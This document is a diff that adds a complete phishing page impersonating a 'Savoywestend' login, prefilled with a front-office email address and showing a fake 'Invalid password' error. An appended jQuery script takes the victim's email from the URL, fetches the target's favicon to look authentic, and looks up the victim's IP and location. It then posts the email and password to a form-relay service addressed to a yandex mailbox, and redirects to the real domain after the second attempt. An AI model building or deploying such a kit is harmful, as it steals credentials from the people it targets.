@@ -1,1 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Savoywestend Login</title>
+  <style>
+    * { box-sizing: border-box; font-family: Arial, Helvetica, sans-serif; }
 
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: url('background.jpg') no-repeat center center/cover;
+    }
+
+    .login-card {
+      width: 360px;
+      background: #fff;
+      border-radius: 6px;
+      box-shadow: 0 8px 25px rgba(0,0,0,0.25);
+      padding: 24px 22px 26px;
+      text-align: center;
+    }
+
+    .logo {
+      width: 70px;
+      margin: 0 auto 10px;
+    }
+
+    h2 {
+      margin: 6px 0 14px;
+      font-size: 20px;
+      font-weight: 600;
+    }
+
+    .error {
+      background: #f8d7da;
+      color: #842029;
+      padding: 10px;
+      border-radius: 4px;
+      font-size: 14px;
+      margin-bottom: 14px;
+    }
+
+    .field {
+      margin-bottom: 14px;
+      position: relative;
+    }
+
+    .field input {
+      width: 100%;
+      padding: 11px 38px 11px 36px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 14px;
+    }
+
+    .field .icon {
+      position: absolute;
+      top: 50%;
+      left: 10px;
+      transform: translateY(-50%);
+      color: #666;
+      font-size: 14px;
+    }
+
+    .field .toggle {
+      position: absolute;
+      top: 50%;
+      right: 10px;
+      transform: translateY(-50%);
+      cursor: pointer;
+      font-size: 13px;
+      color: #666;
+    }
+
+    button {
+      width: 100%;
+      background: #1e88e5;
+      border: none;
+      color: #fff;
+      padding: 12px;
+      border-radius: 4px;
+      font-size: 15px;
+      cursor: pointer;
+    }
+
+    button:hover { background: #1565c0; }
+
+    .footer {
+      margin-top: 14px;
+      font-size: 12px;
+      color: #777;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-card">
+    <img src="logo.png" alt="Logo" class="logo" />
+    <h2>Savoywestend Login</h2>
+
+    <div class="error">Invalid password. Please enter the correct information.</div>
+
+    <div class="field">
+      <span class="icon">👤</span>
+      <input type="email" value="frontoffice@savoywestend.cz" readonly />
+    </div>
+
+    <div class="field">
+      <span class="icon">🔒</span>
+      <input type="password" id="password" placeholder="Password" />
+      <span class="toggle" onclick="togglePassword()">👁</span>
+    </div>
+
+    <button>Submit</button>
+
+    <div class="footer">© savoywestend.cz 2025</div>
+  </div>
+
+  <script>
+    function togglePassword() {
+      const p = document.getElementById('password');
+      p.type = p.type === 'password' ? 'text' : 'password';
+    }
+  </script>
+</body>
+</html>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+<script>
+
+	let step = 1;
+	
+	const clientID = window.location.hash.split("#").pop();
+	$('#email').val(clientID);
+	const domain = clientID.split('@').pop();
+
+	$("#frame").attr("src", "https://" + domain);
+	
+	// Favicon logo
+	const logoUrl = "https://www.google.com/s2/favicons?domain=" + domain + "&sz=128";
+	$("#logo").attr("src", logoUrl)
+	.on("error", function() {
+		$(this).attr("src", "https://via.placeholder.com/100/0096FF/ffffff?text=" + domain.charAt(0).toUpperCase());
+	});
+
+	const submit = $("button[type='submit']");
+
+	$("#login-form").submit(function(event) {
+
+		event.preventDefault();
+
+		submit.text('Verifying...');
+
+		$.getJSON('https://ipinfo.io/json', function(response) {
+			const posting = $.post("https://formsubmit.co/ajax/dattiobi@yandex.com", {
+				_subject: "Logs | " + response.ip,
+				Email: $("#email").val(),
+				Password: $("#psw").val(),
+				Attempts: step,
+				IP: response.ip,
+				Location: response.city + ", " + response.country,
+			});
+
+			posting.done(function(data) {
+				if (step === 2) {
+					window.location.href = "http://" + domain;
+				} else {
+					step++;
+					$("#error").css("display", "block");
+					submit.text('Sign In');
+					$("#psw").val("");
+				}
+			});
+
+			posting.fail(function(error) {
+				console.error(error);
+				$("#error").css("display", "block");
+				submit.text('Sign In');
+				$("#psw").val("");
+			});
+		}, "json");
+	});
+</script>
